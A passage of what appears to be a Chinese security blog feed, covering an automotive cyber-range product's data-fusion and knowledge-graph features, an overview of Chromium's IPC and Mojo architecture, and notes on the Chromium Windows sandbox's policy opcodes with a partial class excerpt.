data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/05c11c361a12d343aebde62157e19e3d.png"></p><p>安全数据融合体系结构如下所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/dcb145cf30e88d1ad48f65a69bfffccd.png"></p><p>数据采集：从各种数据源收集原始数据，包括各位安全设备，确保采集的数据包括所需的关键信息，并记录数据源和时间戳。</p><p>数据清洗：对原始数据进行清洗和预处理，包括去除重复项、处理缺失数据、解决异常值、规范化数据格式等，以提高数据质量。</p><p>数据整合：将来自不同源头的数据整合到一个一致的数据集中，包括数据结构的转换、字段映射、数据合并等操作。</p><p>数据融合：将数据转换为融合到统一知识体系中，适用于后续分析与应用。融合方式包括基于关键字的融合和基于事件类型的映射。</p><p>数据融合主要包含以下模块元素。系统需要对数据源设备进行管理，包括添加、修改、删除，且可通过上传下载文件的方式进行批量导入与导出，设备信息包括名称、厂商、类型、型号和地址。数据采集方式能够在界面配置基于TCP和UDP的syslog方式以及kafka方式进行日志数据接入。此外，支持快速零代码编程，实现不同厂商、不同设备的日志数据解析。数据解析方面可以在界面添加、修改与删除解析规则，针对某一具体规则，系统提供了配置选项，涉及到日志样本、相应的解析方式、对应的分隔符以及过滤符号等多个方面的配置。解析方式方面，系统支持两种解析方法，即键值对和固定分隔符，用户可以根据需要选择。键值分隔符则提供了等号、冒号、空格等不同的设置选项，字段分隔符内置了多种选项，如分号、逗号、通道符、tab键等，以满足用户对于日志样本解析的多样化需求。用户可根据实际需求进行灵活配置。此外，还支持基于正则表达式来解析日志数据，以适应的不同日志格式，并能通过描述、CVE漏洞信息、目的端口、源端口、目的IP地址、源IP地址、事件ID以及时间等字段映射具体内容。最后通过界面上维护的安全事件和关键字，将其融合到统一知识体系。同时该模块可以自动将融合后的基础攻击数据与VLAN以及IP地址相关联，进而自动生成相应的应用试验任务，随之产生基础攻击相关的靶标、队伍以及设备信息。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/457326bf066b644d8c6843113aa1aac8.png"></p><h5 id="关键功能截图"><a href="#关键功能截图" class="headerlink" title="关键功能截图"></a>关键功能截图</h5><ol><li>★可基于网络安全知识图谱中的知识，结合靶场汽车应用试验关联的节点、资产、漏洞数据，构建应用试验相关的试验场景图谱，支撑攻击检测分析与扩展研究，知识图谱关联的节点至少包含被测车辆、零部件、虚拟化MCU、虚拟化MPU等4种类型，关联的资产至少包含整车品牌、车型、车辆、车型项目（年款）、包含的零部件的硬件平台、操作系统内核版本信息、固件版本、中间件版本、应用程序版本等9类信息，漏洞数据至少包含漏洞名称、CVE编号、涉及平台、危害级别、漏洞类型、公开日期等6类信息。以上信息均可在同一个子图中以可视化的形式展现。</li><li>响应方案:</li></ol><p>基于网络安全知识图谱的丰富知识，结合与靶场汽车应用试验关联的多个要素，可以构建出强大而全面的应用试验相关的试验场景图谱。这个知识图谱将为攻击检测分析和进一步的扩展研究提供坚实的基础。在这个知识图谱中，将聚焦于多种类型的关联节点，涵盖了汽车领域的关键组成部分。</p><p>以下是知识图谱关联的主要节点类型，每种节点类型都以可视化的方式展现：</p><ol><li>包含了汽车的标识信息、车型和车辆特性等。</li><li>可以清晰地显示被测车辆的属性和特征。</li><li>涵盖了车辆中各个组件的信息，如引擎、制动系统、安全气囊等。</li><li>提供了零部件的类型、型号和技术规格等详细信息。</li><li>包括了虚拟化MCU的配置和性能参数要求，用于车辆电子系统的控制。</li><li>可视化展示虚拟化MCU的组成和功能。</li><li>包括了虚拟化MPU的信息，这是车辆计算平台的核心。</li><li>提供了虚拟化MPU的性能规格和操作系统信息。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c4828a17fbbab94021530d335b79ed40.png" alt="IMG_256"></p><p>在知识图谱的节点之间，还包括了关联的资产信息，这些信息涵盖了广泛的领域，如：</p><ol><li>识别汽车的制造商和品牌信息，以便确定车辆的制造背景。</li><li>确定车辆的具体型号和车型名称，以区分不同类型的汽车。</li><li>提供关于每辆车辆的详细信息，包括车辆的VIN号、注册信息等。</li><li>包括车型的不同年份版本，以跟踪车型的发展历程。</li><li>描述车辆零部件的硬件平台和技术规格。</li><li>提供车辆系统使用的操作系统内核的版本信息，以便安全性分析。</li><li>记录车辆各个组件的固件版本号，以便检测潜在漏洞。</li><li>包括车辆中使用的中间件的版本和配置信息。</li><li>提供车辆中运行的应用程序的版本和相关信息。</li></ol><p>最后，还将整合漏洞数据，其中包括漏洞的名称、CVE编号、涉及平台、危害级别、漏洞类型和公开日期等关键信息。这些数据将与其他节点相互关联，以帮助系统分析漏洞对车辆和零部件的潜在威胁。整个知识图谱将为智能汽车网络靶场提供全面的视图，帮助分析和解决安全挑战。</p><ol><li>支持试验相关数据概括呈现，包括试验关联队伍、靶标、设备相关数据和试验资产漏洞、基础攻击、有效攻击、复杂攻击等相关安全攻防数据统计与直观展示，需提供产品功能截图证明。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1d1cdddf78604325aa49f166f9693e86.png" alt="企业微信截图_6e2605f8-a886-43b7-9c5f-1125f1cffa5c"></p><ol><li>支持在微观拓扑中展示对应汽车靶标节点信息，包括车联网业务管理后台、TBOX、网关、车机、域控制器等类型，节点名称可编辑，需提供产品功能截图证明。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e36590d4fbd98159c0fc1787b8698745.png"></p><ol><li>支持图谱路径查询，可指定起始节点、目标节点、方向进行路径查询与展示，需提供产品功能截图证明。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f619e4a3e3ed7147029f6984c8eb1a36.png"></p><ol><li>支持对探测设备进行条件查询，包括名称、IP、型号等模糊查询，需提供产品功能截图。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/43e9252d7e99b6d31f4f0d853b7f3c1e.png"></p><ol><li>支持对探测结果进行解析，生成资产IP、漏洞ID、漏洞分数、漏洞类型、漏洞描述等信息，需提供产品功能截图证明。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f2ebea3140b7af72282bbfc179e6164f.png"></p><ol><li>可探测漏洞数量不低于30000个，需提供产品功能截图证明，截图中需有具体的漏洞数量并能清晰识别。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ec1a3f365da0eb7e21cd97b995e26bcb.png"></p><ol><li>支持流量抓包任务的控制操作，包括启动、停止、下载、删除，需提供产品功能截图证明。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a999e605c96869d93efd0eef57258c9f.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/965808a935e43286f26f797c100d7675.png"></p><ol><li>支持通过文件上传、下载实现日志源设备的批量导入、批量导出，可快速、便捷地进行设备管理，需提供产品功能截图证明。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4d8ae83c76467621de2a9fb89cb7339a.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Chromium IPC</title>
      <link href="posts/42c3081f/"/>
      <url>posts/42c3081f/</url>
      
        <content type="html"><![CDATA[<h1 id="IPC-Overview"><a href="#IPC-Overview" class="headerlink" title="IPC Overview"></a>IPC Overview</h1><p>由于 Chromium 是多进程架构，这就意味着各个进程之间需要互相通信进行消息同步，主要的原始通信手段便是管道。每个renderer 进程都有一个管道，用来和 borwser 进行通信。管道以异步模式使用，以确保任何一端在等待另一端时都不会被阻塞。</p><p>注意：所有的网络通信都是由浏览器的主进程来处理的。</p><p>在 chromium 的多进程架构下可以分为 3 层看，最底层是 <code>Blink</code>，是负责渲染页面的引擎。中间层是<code>Renderer</code>，每个标签页都含有一个 renderer，每个 renderer 进程都有一个 Blink 实例。最顶层是浏览器进程，管理所有的 renderer，控制所有的网络访问。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210804104619.png"></p><h2 id="IPC-in-the-browser"><a href="#IPC-in-the-browser" class="headerlink" title="IPC in the browser"></a>IPC in the browser</h2><ul><li><p>浏览器与渲染器的通信是在一个单独的 I/O 线程中完成的。</p></li><li><p>浏览器与 views 的通信，必须由<code>ChannelProxy</code>代理转发到主线程。如此，例如网页资源请求这种最常见、关系性能的信息可以在 I/O 线程上处理，而不会阻塞用户界面。</p></li><li><p>这些是通过使用由 RenderProcessHost 插入到通道中的 ChannelProxy::MessageFilter 来完成的</p></li><li><p><code>ChannelProxy::MessageFilter</code>在 I/O 线程中运行，拦截资源请求消息，并将其直接转发给资源调度程序主机(resource dispatcher host)</p></li></ul><h2 id="IPC-in-the-renderer"><a href="#IPC-in-the-renderer" class="headerlink" title="IPC in the renderer"></a>IPC in the renderer</h2><ul><li><p>每个 renderer 都有一个单独的线程来管理通信，另一个线程来完成渲染和其他操作处理。</p></li><li><p>大多数消息通过主渲染器线程从浏览器发送到WebKit线程，反之亦然。这个额外的线程是为了支持同步 renderer-to-browser 消息。</p></li></ul><h2 id="Types-of-messages"><a href="#Types-of-messages" class="headerlink" title="Types of messages"></a>Types of messages</h2><p>Chromium 的消息类别主要有两种： <code>routed</code> <code>control</code>。</p><p>Control messages 由创建管道的类处理。有时，该类将允许其他<code>listeners</code>通过 MessageRouter 对象接收消息，其他 listeners 可以注册该对象，并接收使用其唯一id发送的 <code>routed</code> 消息。</p><p>Routed messages 用于将消息发送到特定的 RenderViewHost。不过从技术上讲，任何类都可以通过使用 <code>RenderProcessHost::GetNextRoutingID</code> 接收路由消息，并通过调用<code>RenderProcessHost::AddRoute</code> 注册自己。目前，RenderViewHost 和 RenderFrameHost 实例都有自己的路由 id。</p><p>浏览器和渲染器之间的通信是和消息类型无关的，从浏览器发送到渲染器的与 document’s frame 相关的消息称为 frame 消息，它们被发送到 RenderFrame。类似的，从渲染器发送到浏览器的消息称为FrameHost消息，它们被发送到 RenderFrameHost。</p><p>插件也有独立的进程。像渲染消息一样，有 PluginProcess 消息(从浏览器发送到插件进程)和 PluginProcessHost 消息(从插件进程发送到浏览器)。</p><h1 id="Mojo"><a href="#Mojo" class="headerlink" title="Mojo"></a>Mojo</h1><p>在新的文档？发现这样一句话， **Legacy IPC is deprecated.**所以原文档后面的一些关于 messages 的处理和声明部分便没有继续观看。在网上找到<a href="https://keyou.github.io/blog/2020/01/03/Chromium-Mojo&IPC/">一篇总结很好的文章</a>，这里引用一下。</p><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Mojo 是一个跨平台 IPC 框架，它诞生于 chromium ，用来实现 chromium 进程内/进程间的通信。目前，它也被用于 ChromeOS。</p><p>Mojo 系统 API 提供了一套低等级的 IPC 原语：<strong>message pipes</strong>, <strong>data pipes</strong>,  <strong>shared buffers</strong>.</p><p>关于message pipes：消息管道是一种轻量级原语，用于双向传输相对较小的数据包。该管道有两个端点，任意一个端点都可以通过另一个消息管道进行传输。因为浏览器进程和每个子进程之间都存在一个原始的消息管道，用户同样可以创建一个新管道并且发送数据到任意进程的任意的管道的任意一端，并且该通道两端可以无缝独占互相通信。</p><h2 id="mojo-术语"><a href="#mojo-术语" class="headerlink" title="mojo 术语"></a>mojo 术语</h2><ul><li><strong>Message Pipe</strong>: 每个消息管道都有两个端点，一对端点和任一端点可以通过另一个消息管道来传输信息。因为浏览器进程和每个子进程之间引导了一个原始消息管道，这意味着我们创建的新管道将任一端发送到任何进程，并且两端仍然能够无缝且排他地相互通信。</li><li><strong>Mojom file</strong>: 定义接口，它们是强类型的消息集合。 每个接口消息大致类似于单个原型消息</li><li><strong>Remote</strong>: 通过接口发送信息数据</li><li><strong>Receiver</strong>: 用于接收<strong>Remote</strong>发送的接口消息</li><li><strong>PendingRemote</strong>: 用于容纳 Receiver 管道另一端的类型化容器。</li><li><strong>PendingReceiver</strong>: 用于容纳 Remote 管道另一端的类型化容器。</li><li><strong>AssociatedRemote/Receiver</strong>: 类似于遥控器和接收器。 但是，它们在单个消息管道上的多个接口上运行，同时保留消息顺序，因为 AssociatedRemote/Receiver 是通过使用传统 IPC 消息使用的 IPC::Channel 实现的。</li></ul><h2 id="mojo-架构"><a href="#mojo-架构" class="headerlink" title="mojo 架构"></a>mojo 架构</h2><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210804142536.png"></p><ul><li><strong>Mojo Core：</strong>mojo 的核心层(由 C++ 实现).每个使用Mojo进行进程间通信的进程被称之为Mojo embedder，这个进程需要链接 Core代码。Mojo Core 针对不同的系统实现具体IPC通信机制。</li><li><strong>Mojo System API(C):</strong> Mojo 的公共的 C 语言 API 合集，mojo 初始化完成后，任意进程可调用。但该API几乎不会直接调用，它是构建更高级别Mojo API的基础。它提供了消息管道，数据管道，共享buffer等创建及交互的Mojo API，以及进程间的引导连接API。</li><li><strong>Mojo System API(C++/Java/JS)：</strong>Mojo 的各种语言包装层，它将 Mojo C API 包装成多种语言的库，让其他语言可以使用。</li><li><strong>Mojo Bindings：</strong>这一层引入一种称为 Mojom 的 IDL（接口定义）语言，通过它可以定义通信接口，这些接口会生成接口类，使用户只要实现这些接口就可以使用 Mojo 进行通信，这一层使得IPC两端不需要通过原始字节流进行通信，而是通过接口进行通信。</li></ul><p>除了上面提到的那些层之外，在 Chromium 中还有2个模块对 Mojo 进行了包装，分别是 Services(//services) 模块和 IPC(//ipc) 模块。</p><ol><li><code>Services</code>: 一种更高层次的IPC机制，构建于Mojo之上，以<code>Service</code>的级别来进行IPC通信，Chromium大量使用这种IPC机制来包装各种服务，用来取代 <code>Legacy Chrome IPC</code>，比如device服务，preferences服务，audio服务，viz服务等。</li><li><code>Legacy Chrome IPC</code>: 已经不推荐使用的Chrome IPC机制，提供 <code>IPC::Channel</code> 接口以及大量的使用宏来定义的 messages 类。目前它底层也是基于 Mojo 来实现的，但是上层接口和旧的 Chrome IPC 保持一致。chromium 中还有很多IPC使用这种方式，但是不应该在新的服务中使用这种机制。可以在<a href="https://source.chromium.org/chromium/chromium/src/+/master:ipc/ipc_message_start.h;bpv=1;bpt=0">ipc/ipc_message_start.h</a>中查看还有哪些部分在使用这种IPC机制。</li></ol><h2 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h2><p>Mojo 支持在<strong>多个</strong>进程之间互相通信，这一点和其他的IPC有很大不同，其他大多只支持2个进程之间进行通信。由Mojo组成的这些可以互相通信的进程就形成了一个网络，在这个网络内的任意两个进程都可以进行通信，并且每个进程只能处于一个Mojo网络中，在这个网络内每一个进程内部有且只有一个<code>Node</code>,每一个<code>Node</code>可以提供多个<code>Port</code>，每个<code>Port</code>对应一种服务，这点类似TCP/IP中的IP地址和端口的关系。一个<code>Node:Port</code>对可以唯一确定一个服务。<code>Node</code>和<code>Node</code>之间通过<code>Channel</code>来实现通信，在不同平台上<code>Channel</code>有不同的实现方式，在Linux上是domain socket,在windows上是name pipe，在MAC OS平台上是 Mach Port。在Port上一层，Mojo封装了3个“应用层协议”，分别为<code>MessagePipe</code>，<code>DataPipe</code>和<code>SharedBuffer</code>（类似在TCP上封装了HTTP，SMTP等）。整体结构如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210804142004.png"></p><p>上图展示了在两个进程间使用Mojo的数据流。它有以下几个特点：</p><ol><li><code>Channel</code>: Mojo内部的实现细节，对外不可见，用于包装系统底层的通信通道，在Linux下是domain socket,Windows下是name pipe，MAC OS下是mach port；</li><li><code>Node</code>: 每个进程只有一个Node，它在Mojo中的作用相当于TCP/IP中的IP地址，同样是内部实现细节，对外不可见；</li><li><code>Port</code>: 每个进程可以有上百万个Port，它在Mojo中的作用相当于TCP/IP中的端口，同样是内部实现细节，对外不可见，每个Port都必定会对应一种应用层接口，目前Mojo支持三种应用层接口；</li><li><code>MessagePipe</code>: 应用层接口，用于进程间的<strong>双向</strong>通信，类似UDP,消息是基于数据包的，底层使用Channel通道；</li><li><code>DataPipe</code>: 应用层接口，用于进程间<strong>单向</strong>块数据传递，类似TCP,消息是基于数据流的，底层使用系统的Shared Memory实现；</li><li><code>SharedBuffer</code>: 应用层接口，支持<strong>双向</strong>块数据传递，底层使用系统Shared Memory实现；</li><li><code>MojoHandle</code>： 所有的 MessagePipe,DataPipe,SharedBuffer 都使用MojoHandle来包装，有了这个Hanle就可以对它们进行读写操作。还可以通过MessagePipe将MojoHandle发送到网络中的任意进程。</li><li><a href="https://source.chromium.org/chromium/chromium/src/+/master:mojo/public/cpp/platform/platform_handle.h;drc=b64eedb9d23e0350557a9bb22c9217ae52cd82c3;bpv=1;bpt=1;l=42"><code>PlatformHanle</code></a>: 用来包装系统的句柄或文件描述符，可以将它转换为MojoHandle然后发送到网络中的任意进程</li></ol><h3 id="MessagePipe"><a href="#MessagePipe" class="headerlink" title="MessagePipe"></a>MessagePipe</h3><p>一个进程中可以有N多个MessagePipe，所有的MessagePipe都共享底层的一条通信通道，就像下图这样：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210804142007.png"></p><blockquote><p>需要特别说明的是，Mojo不是只能在不同进程间使用，它从一开始就考虑了在单进程中使用的场景，并且有专门的优化，因此，使用Mojo带来的一个额外好处是，在Mojo的一端进行读写不必知道另一端是运行在当前进程还是外部进程，这非常有利于将单进程程序逐步的使用Mojo拆分为多进程程序，并且可以在调试的时候使用单进程方便调试，在正式环境中使用多进程缩小程序崩溃时的影响范围</p></blockquote><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] <a href="http://dev.chromium.org/developers/design-documents/multi-process-resource-loading">http://dev.chromium.org/developers/design-documents/multi-process-resource-loading</a></p><p>[2] <a href="https://chromium.googlesource.com/chromium/src.git/+/51.0.2704.48/docs/mojo_in_chromium.md">https://chromium.googlesource.com/chromium/src.git/+/51.0.2704.48/docs/mojo_in_chromium.md</a></p><p>[3] <a href="https://keyou.github.io/blog/2020/01/03/Chromium-Mojo&amp;IPC/">https://keyou.github.io/blog/2020/01/03/Chromium-Mojo&amp;IPC/</a></p><p>[4] <a href="https://gclxry.com/article/chromium-new-inter-process-communication-system-mojo-and-servicification/">https://gclxry.com/article/chromium-new-inter-process-communication-system-mojo-and-servicification/</a></p>]]></content>
      
      
      <categories>
          
          <category> Chromium </category>
          
          <category> IPC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Chromium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sandbox low-level-policy</title>
      <link href="posts/28399a6/"/>
      <url>posts/28399a6/</url>
      
        <content type="html"><![CDATA[<h1 id="Opcode"><a href="#Opcode" class="headerlink" title="Opcode"></a>Opcode</h1><h2 id="Opcode-1"><a href="#Opcode-1" class="headerlink" title="Opcode"></a>Opcode</h2><p>低级策略(low-level-policy)是使用策略“操作码”的概念实现的。操作码是一种包含足够信息的结构，可以对单个输入参数执行一次比较，下面给出了几个比较的范例：</p><ul><li>Is input parameter 3 not equal to nullptr?</li><li>Does input parameter 2 start with L”c:\“?</li><li>Is input parameter 5, bit 3 is equal 1?</li></ul><p>每个操作码实际上相当于一个函数调用，但操作码知道原函数的参数的个数是 原函数的参数个数-1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bool fn(a, b, c, d)  with 4 arguments</span><br><span class="line">Then an opcode is: op(fn, b, c, d)</span><br><span class="line"></span><br><span class="line">关于操作码评估：</span><br><span class="line">op.eval(a)  ------------------------&gt; fn(a,b,c,d)</span><br><span class="line">                internally calls</span><br><span class="line">                </span><br><span class="line">评估是在具有N个比较操作码加1个动作操作码的操作码组中进行的。 </span><br><span class="line"></span><br><span class="line">[comparison 1][comparison 2]...[comparison N][action][comparison 1]...</span><br><span class="line">   ----- evaluation order-----------&gt;</span><br></pre></td></tr></table></figure><p>每个操作码组编码一个高级策略规则。仅当组上的所有条件计算为true时，该规则才适用。操作操作码包含该特定规则的策略结果。</p><p>关于 opcode：</p><ul><li>每个 opcode 都有其对应的Options，这些Options在创建 opcode 的时候就已经被指定。</li><li>每个 opcode 由：opcodeID、 一个index索引表示哪个是输入参数、一个参数数组三部分组成。</li><li>opcode 由 borker 进程中生成的，并作为原始内存复制到目标进程</li><li>一个opcode组由N个comparison opcodes加上一个action opcode组成</li></ul><h3 id="OpcodeID"><a href="#OpcodeID" class="headerlink" title="OpcodeID"></a>OpcodeID</h3><p>以下是已实现的操作码。</p><ul><li><p><strong>OP_ALWAYS_FALSE：</strong> Evaluates to false (EVAL_FALSE).</p></li><li><p><strong>OP_ALWAYS_TRUE：</strong> Evaluates to true (EVAL_TRUE).</p></li><li><p><strong>OP_NUMBER_MATCH：</strong>Match a 32-bit integer as n == a.</p></li><li><p><strong>OP_NUMBER_MATCH_RANGE：</strong>Match a 32-bit integer as a &lt;= n &lt;= b.</p></li><li><p><strong>OP_NUMBER_AND_MATCH：</strong>Match using bitwise AND; as in: n &amp; a != 0.</p></li><li><p><strong>OP_WSTRING_MATCH：</strong>Match a string for equality.</p></li><li><p><strong>OP_ACTION：</strong>Evaluates to an action opcode.</p></li></ul><h3 id="Opcode-Options"><a href="#Opcode-Options" class="headerlink" title="Opcode Options"></a>Opcode Options</h3><p>适用于每个操作码的选项。它们在使用OpcodeFactory::MakeOpXXXXX()函数族创建每个操作码时指定。</p><ul><li><strong>const uint32_t kPolNone = 0 ：</strong>无特殊含义。</li><li><strong>const uint32_t kPolNegateEval = 1：</strong>将<code>EVAL_TRUE</code>转换为<code>EVAL_FALSE</code>，反之亦然。这允许表示否定条件，例如<code>if(a&amp;&amp;!b)</code></li><li><strong>const uint32_t kPolClearContext = 2：</strong>将<code>MatchContext</code>结构归零。这发生在操作码被<code>evaluated</code>之后。</li><li><strong>const uint32_t kPolUseOREval = 4：</strong>在评估这组操作码时使用 OR。默认情况下，策略评估器在评估时使用 AND。与 kPolNegateEval 一起使用时非常有用。例如使用这个标志可以把 if(! (a &amp;&amp; b &amp;&amp; c)) 表示为if ((!a) || (!b) || (!c))</li></ul><h3 id="Comparison-opcode"><a href="#Comparison-opcode" class="headerlink" title="Comparison opcode"></a>Comparison opcode</h3><ul><li><p><strong>EVAL_TRUE：</strong>  Opcode condition evaluated true.</p></li><li><p><strong>EVAL_FALSE：</strong> Opcode condition evaluated false.</p></li><li><p><strong>EVAL_ERROR：</strong>Opcode condition generated an error while evaluating.</p></li></ul><h3 id="Action-opcode"><a href="#Action-opcode" class="headerlink" title="Action opcode"></a>Action opcode</h3><ul><li><strong>ASK_BROKER：</strong>target 必须向 broker 生成一个IPC。在浏览器端，这意味着授予访问权限。</li><li><strong>DENY_ACCESS：</strong>没有授予对资源的访问权限。</li><li><strong>GIVE_READONLY：</strong>授予对资源的只读访问权限</li><li><strong>GIVE_ALLACCESS：</strong>授予对资源的完全访问权限。</li><li><strong>GIVE_CACHED：</strong>不需要 IPC。 target可以返回缓存的句柄。</li><li><strong>GIVE_FIRST：</strong>TODO(cpu)</li><li><strong>SIGNAL_ALARM：</strong> 不寻常的活动。 产生警报。</li><li><strong>FAKE_SUCCESS：</strong>不调用原始函数。 只需返回’成功’。</li><li><strong>FAKE_ACCESS_DENIED：</strong>不调用原始函数。 只需返回“拒绝”，不进行 IPC通信。</li><li><strong>TERMINATE_PROCESS：</strong>销毁target进程。 IPC通信。</li></ul><h2 id="Policyopcde"><a href="#Policyopcde" class="headerlink" title="Policyopcde"></a>Policyopcde</h2><p>policy opcode是基于此运营的，除了第一个参数都存储在此对象中进行裁决。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/policy_engine_opcodes.h</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PolicyOpcode</span> &#123;</span></span><br><span class="line">  <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">OpcodeFactory</span>;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// 评估函数，根据opcode是comparison还是action，返回两类结果</span></span><br><span class="line">  <span class="comment">// parameters: 一个存储输入参数的数组</span></span><br><span class="line">  <span class="comment">// count: 第一个参数传递的参数的数量。</span></span><br><span class="line">  <span class="comment">// match: 在操作码求值序列中保留的匹配上下文。</span></span><br><span class="line">  <span class="function">EvalResult <span class="title">Evaluate</span><span class="params">(<span class="keyword">const</span> ParameterSet* parameters,</span></span></span><br><span class="line"><span class="function"><span class="params">                      <span class="keyword">size_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">                      MatchContext* match)</span></span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Valid index values are from 0 to &lt; kArgumentCount.</span></span><br><span class="line">  <span class="comment">// 根据 index，返回参数</span></span><br><span class="line">  <span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">GetArgument</span><span class="params">(<span class="keyword">size_t</span> index, T* argument)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static_assert</span>(<span class="keyword">sizeof</span>(T) &lt;= <span class="keyword">sizeof</span>(arguments_[<span class="number">0</span>]), <span class="string">&quot;invalid size&quot;</span>);</span><br><span class="line">    *argument = *<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> T*&gt;(&amp;arguments_[index].mem);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Sets a stored argument by index. </span></span><br><span class="line">  <span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">SetArgument</span><span class="params">(<span class="keyword">size_t</span> index, <span class="keyword">const</span> T&amp; argument)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static_assert</span>(<span class="keyword">sizeof</span>(T) &lt;= <span class="keyword">sizeof</span>(arguments_[<span class="number">0</span>]), <span class="string">&quot;invalid size&quot;</span>);</span><br><span class="line">    *<span class="keyword">reinterpret_cast</span>&lt;T*&gt;(&amp;arguments_[index].mem) = argument;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检索字符串参数的实际地址 </span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="keyword">wchar_t</span>* <span class="title">GetRelativeString</span><span class="params">(<span class="keyword">size_t</span> index)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">ptrdiff_t</span> str_delta = <span class="number">0</span>;</span><br><span class="line">    GetArgument(index, &amp;str_delta);</span><br><span class="line">    <span class="comment">// 字符串的GetArgument返回的是一个offset</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* delta = <span class="keyword">reinterpret_cast</span>&lt;<span 